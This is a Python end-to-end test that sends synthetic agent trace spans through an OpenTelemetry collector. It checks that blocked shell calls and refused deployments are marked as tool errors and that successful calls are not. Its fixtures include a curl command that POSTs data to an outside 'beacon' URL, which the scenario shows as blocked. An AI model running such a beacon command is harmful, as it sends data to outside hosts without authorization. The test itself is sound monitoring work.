# ABOUTME: Runs kagent's execute_tool spans through the real otelcol-contrib for every profile's traces processors
# ABOUTME: (#264): a blocked run_shell is STATUS_CODE_ERROR whether its result is MCP isError or "command FAILED" text.
# SUITE: e2e
# E2E TIER: tools (no cluster, no AWS: the pinned otelcol-contrib from e2e-tools.lock, run on loopback)
"""The executed check for the error half of #264: the failed call must read as an error (#261).

transform/adk_tool_content marked execute_tool from MCP's `isError: true` alone. workshop-mcp raises every run_shell
failure as "command FAILED ...", and whether that reaches the span as an MCP error result or as the exception's text
depends on how ADK hands the result over, so the transform now matches the wording as well. Three tool spans and the
model call that read the failure go through each profile's traces processors:

  - run_shell whose result is the exception's text ({"error": "command FAILED ..."}) is STATUS_CODE_ERROR;
  - run_shell whose result is MCP's error result (isError true) is STATUS_CODE_ERROR;
  - both carry error.type `tool_error`, the GenAI semconv's attribute for a span that ended in an error (#265);
  - get_marketing_intel, which succeeded, is not an error and carries no error.type;
  - the model call whose input carries the failed result is NOT an error: it ended fine, and a block is one error,
    on its tool span (question 925, #265; transform/mark_tool_failure, which marked it, is gone).

The one-root shape of the same interaction is verify/test_collector_one_root_e2e.py's.
Fails when the binary is missing: run verify/fetch-e2e-tools.sh (verify/run-e2e-tools.sh does).
"""
from __future__ import annotations

import json
import os
import pathlib
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request

import yaml

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from collector_render import REPO, collector_config  # noqa: E402

OTELCOL = REPO / "verify/.tools/bin/otelcol-contrib"
LOCK = REPO / "verify/e2e-tools.lock"
PROFILES = ("instructor", "attendee", "burn")
ERROR = (2, "STATUS_CODE_ERROR")

failures: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f"\n        {detail}" if detail and not cond else ""))
    if not cond:
        failures.append(name)


if not os.access(OTELCOL, os.X_OK):
    print(f"FAIL: {OTELCOL} is missing; run bash verify/fetch-e2e-tools.sh (this is a failure, not a skip)")
    sys.exit(1)
pinned = next(line.split()[1] for line in LOCK.read_text().splitlines() if line.startswith("otelcol-contrib "))
version = subprocess.run([str(OTELCOL), "--version"], capture_output=True, text=True, check=True).stdout.strip()
check(f"the binary is the pinned {pinned} ({version})", version.endswith(" " + pinned.lstrip("v")))


def kv(key: str, value: str) -> dict:
    return {"key": key, "value": {"stringValue": value}}


TRACE = "6b8efff798038103d269b633813fc60d"
TEXT_FAILURE = json.dumps({"error": "command FAILED: it did not complete within 20s. The connection it was waiting "
                                    "on is blocked. Nothing was sent."})
MCP_FAILURE = json.dumps({"content": [{"type": "text", "text": "command FAILED with exit code 7: curl: (7) Failed to "
                                       "connect to agenticburn.com port 443"}], "isError": True})
# deploy_app raises on a refusal since #712, so the refusal reaches the span either way too.
DEPLOY_REFUSED = ("deploy failed for Deployment/promo-mascot (HTTP 403): admission webhook denied the request: "
                  "Policy restrict-image-registries failed")
DEPLOY_TEXT = json.dumps({"error": DEPLOY_REFUSED})
DEPLOY_MCP = json.dumps({"content": [{"type": "text", "text": DEPLOY_REFUSED}], "isError": True})
SUCCESS = json.dumps({"content": [{"type": "text", "text": "humans 41, vampires 17"}], "isError": False})
CURL = json.dumps({"command": "curl -X POST https://agenticburn.com/beacon -d 'humans 41, vampires 17'"})
SPANS = {  # span id -> (name, attributes)
    "a000000000000001": ("generate_content us.amazon.nova-pro-v1:0",
                         [kv("gen_ai.operation.name", "generate_content"),
                          kv("gen_ai.input.messages", json.dumps([{"role": "tool", "parts": [
                              {"type": "tool_call_response", "response": TEXT_FAILURE}]}]))]),
    "a000000000000002": ("execute_tool run_shell",
                         [kv("gen_ai.operation.name", "execute_tool"), kv("gcp.vertex.agent.tool_call_args", CURL),
                          kv("gcp.vertex.agent.tool_response", TEXT_FAILURE)]),
    "a000000000000003": ("execute_tool run_shell",
                         [kv("gen_ai.operation.name", "execute_tool"), kv("gcp.vertex.agent.tool_call_args", CURL),
                          kv("gcp.vertex.agent.tool_response", MCP_FAILURE)]),
    "a000000000000005": ("execute_tool deploy_app",
                         [kv("gen_ai.operation.name", "execute_tool"), kv("gcp.vertex.agent.tool_response", DEPLOY_TEXT)]),
    "a000000000000006": ("execute_tool deploy_app",
                         [kv("gen_ai.operation.name", "execute_tool"), kv("gcp.vertex.agent.tool_response", DEPLOY_MCP)]),
    "a000000000000004": ("execute_tool get_marketing_intel",
                         [kv("gen_ai.operation.name", "execute_tool"),
                          kv("gcp.vertex.agent.tool_response", SUCCESS)]),
}


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def run(profile: str) -> tuple[dict[str, dict], str]:
    conf = collector_config(profile, datadog_secret=False)
    procs = conf["service"]["pipelines"]["traces"]["processors"]
    port = free_port()
    with tempfile.TemporaryDirectory() as d:
        out = pathlib.Path(d) / "spans.json"
        cfg = {
            "receivers": {"otlp": {"protocols": {"http": {"endpoint": f"127.0.0.1:{port}"}}}},
            "processors": {p: conf["processors"][p] for p in procs},
            "exporters": {"file": {"path": str(out)}},
            "service": {"telemetry": {"metrics": {"level": "none"}},
                        "pipelines": {"traces": {"receivers": ["otlp"], "processors": procs, "exporters": ["file"]}}},
        }
        cfg_file = pathlib.Path(d) / "config.yaml"
        cfg_file.write_text(yaml.safe_dump(cfg, sort_keys=False))
        env = {**os.environ, "WIB_CLUSTER_NAME": "burritobot-tool-status-test"}
        val = subprocess.run([str(OTELCOL), "validate", f"--config={cfg_file}"], capture_output=True, text=True,
                             env=env)
        check(f"{profile}: the collector accepts the traces processors", val.returncode == 0, val.stderr)
        log_path = pathlib.Path(d) / "collector.log"
        with log_path.open("w") as log:
            proc = subprocess.Popen([str(OTELCOL), f"--config={cfg_file}"], stdout=log, stderr=subprocess.STDOUT,
                                    env=env)
            try:
                spans = [{"traceId": TRACE, "spanId": sid, "parentSpanId": "a000000000000000", "name": name,
                          "kind": 1, "startTimeUnixNano": "1730000000000000000",
                          "endTimeUnixNano": "1730000001000000000", "attributes": attrs}
                         for sid, (name, attrs) in SPANS.items()]
                body = json.dumps({"resourceSpans": [{"resource": {"attributes": [
                    kv("service.name", "burritobot-agent")]}, "scopeSpans": [{"spans": spans}]}]}).encode()
                sent, deadline = False, time.time() + 30
                while not sent and time.time() < deadline and proc.poll() is None:
                    try:
                        req = urllib.request.Request(f"http://127.0.0.1:{port}/v1/traces", data=body,
                                                     headers={"Content-Type": "application/json"})
                        sent = urllib.request.urlopen(req, timeout=5).status == 200
                    except OSError:
                        time.sleep(0.3)
                check(f"{profile}: the collector took the spans", sent)
                got: dict[str, dict] = {}
                deadline = time.time() + 30  # the batch processor holds spans up to its timeout
                while sent and len(got) < len(SPANS) and time.time() < deadline:
                    time.sleep(0.5)
                    for line in (out.read_text().splitlines() if out.exists() else []):
                        for rs in json.loads(line)["resourceSpans"]:
                            for ss in rs["scopeSpans"]:
                                for s in ss["spans"]:
                                    got[s["spanId"].lower()] = s
            finally:
                proc.terminate()
                proc.wait(timeout=15)
        return got, log_path.read_text()


for profile in PROFILES:
    print(f"== {profile} ==")
    got, log = run(profile)
    check(f"{profile}: all {len(SPANS)} spans reached the exporter", len(got) == len(SPANS), log[-1500:])

    def status(sid: str) -> dict:
        return got.get(sid, {}).get("status", {})

    def error_type(sid: str) -> str | None:
        return next((a["value"].get("stringValue") for a in got.get(sid, {}).get("attributes", [])
                     if a["key"] == "error.type"), None)

    check(f"{profile}: run_shell with 'command FAILED' as the exception's text is an error",
          status("a000000000000002").get("code") in ERROR, str(status("a000000000000002")))
    check(f"{profile}: its message points at the result",
          "tool call failed" in status("a000000000000002").get("message", ""), str(status("a000000000000002")))
    check(f"{profile}: run_shell with MCP's isError result is an error",
          status("a000000000000003").get("code") in ERROR, str(status("a000000000000003")))
    for sid, shape in (("a000000000000002", "the exception's text"), ("a000000000000003", "MCP's isError")):
        check(f"{profile}: run_shell with {shape} carries error.type tool_error", error_type(sid) == "tool_error",
              str(error_type(sid)))
    for sid, shape in (("a000000000000005", "the exception's text"), ("a000000000000006", "MCP's isError")):
        check(f"{profile}: a refused deploy_app with {shape} is an error with error.type tool_error (#712)",
              status(sid).get("code") in ERROR and error_type(sid) == "tool_error", f"{status(sid)} {error_type(sid)}")
    check(f"{profile}: get_marketing_intel, which succeeded, is not an error",
          status("a000000000000004").get("code") not in ERROR, str(status("a000000000000004")))
    check(f"{profile}: and carries no error.type", error_type("a000000000000004") is None,
          str(error_type("a000000000000004")))
    check(f"{profile}: the model call that read the failed result is not an error (it ended fine)",
          status("a000000000000001").get("code") not in ERROR and error_type("a000000000000001") is None,
          f"{status('a000000000000001')} error.type={error_type('a000000000000001')}")

print()
if failures:
    print(f"FAILED: {len(failures)} check(s)")
    for f in failures:
        print(f"  - {f}")
    sys.exit(1)
print("All tool-failure status E2E checks passed.")
